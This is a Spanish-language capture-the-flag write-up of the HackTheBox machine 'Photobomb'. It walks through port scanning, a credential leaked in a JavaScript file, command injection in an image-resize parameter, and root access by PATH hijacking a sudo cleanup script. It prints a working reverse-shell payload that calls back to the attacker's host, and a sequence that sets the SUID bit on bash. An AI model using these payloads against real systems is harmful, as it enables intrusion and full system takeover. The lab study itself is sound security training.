---
title: HackTheBox - Photobomb
author: cotes
date: 2023-09-20 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Information Leakage', 'Command Injection', 'Path Hijacking']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Photobomb/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Photobomb Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **Information Leakage, Command Injection, Path Hijacking**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Photobomb/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Photobomb/02-versions.png)

* Si visitamos la página web nos redirigirá a **photobomb.htb**, así que lo agregamos al /etc/hosts

c. Al inspeccionar el sitio web nos encontramos con un fichero `photobomb.js` el cual contiene una credencial para el directorio **/printer**

```js
('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
```

d. Una vez entremos a este sitio, veremos que podemos redimensionar imágenes para descargarlas. Capturamos la petición con Burp Suite y empezamos a jugar con los parámetros

![](/assets/images/HTB/Easy/Photobomb/03-web.png)

![](/assets/images/HTB/Easy/Photobomb/04-web.png)

> Si manipulamos el parámetro `dimensions` obtendremos diferentes respuestas, así que podemos intuir que es vulnerable a una inyección de comandos.
{: .prompt-tip }

* Para saber si tenemos ejecución de comandos, nos pondremos en escucha de trazas ICMP y enviaremos un ping

![](/assets/images/HTB/Easy/Photobomb/05-ping.png)

![](/assets/images/HTB/Easy/Photobomb/06-tcp.png)

e. Al tener ejecución de comandos, nos entablamos una reverse shell

```bash
Payload Burp Suite: dimensions=30x20%0a`bash -c "bash -i >%26 /dev/tcp/<tun0 IP>/443 0>%261"`
----------------------------------------------------------------------------------------------
❯ nc -lvnp 443
bash-5.0$ whoami
wizard
```

### Escalada de Privilegios 💹

a. Listamos nuestros permisos a nivel de sudoers

```bash
bash-5.0$ sudo -l
User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

* Analizamos el script `/opt/cleanup.sh`

    ```bash
    bash-5.0$ cat cleanup.sh
    #!/bin/bash
    . /opt/.bashrc
    cd /home/wizard/photobomb

    # clean up log files
    if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
    then
    /bin/cat log/photobomb.log > log/photobomb.log.old
    /usr/bin/truncate -s0 log/photobomb.log
    fi

    # protect the priceless originals
    find source_images -type f -name '*.jpg' -exec chown root:root {} \;
    ```

    * Conclusiones:
        + [x] El script carga las configuraciones de `/opt/.bashrc`
        + [x] **find** se llama de forma relativa por lo que es vulnerable a un **Path Hijacking**
        + [x] El permiso `SETENV` nos permite indicar un PATH para la ejecución del script

* Vemos una configuración 'novedosa' en **/opt/.bashrc**

    ```bash
    # Jameson: caused problems with testing whether to rotate the log file                                                                                        
    enable -n [ # ]
    ```

    > `[` es un comando integrado en la bash, pero, al indicar `enable -n [` deshabilitamos esta opción. Por lo que se vuelve otro comando el cual se llama de forma relativa y también es vulnerable a **Path Hijacking**
    {: .prompt-info }

b. Conseguimos acceso como root con un Path Hijacking

```bash
bash-5.0$ echo -n 'chmod +s /bin/bash' > [
bash-5.0$ chmod +x [
bash-5.0$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
bash-5.0$ bash -p
whoami
root
```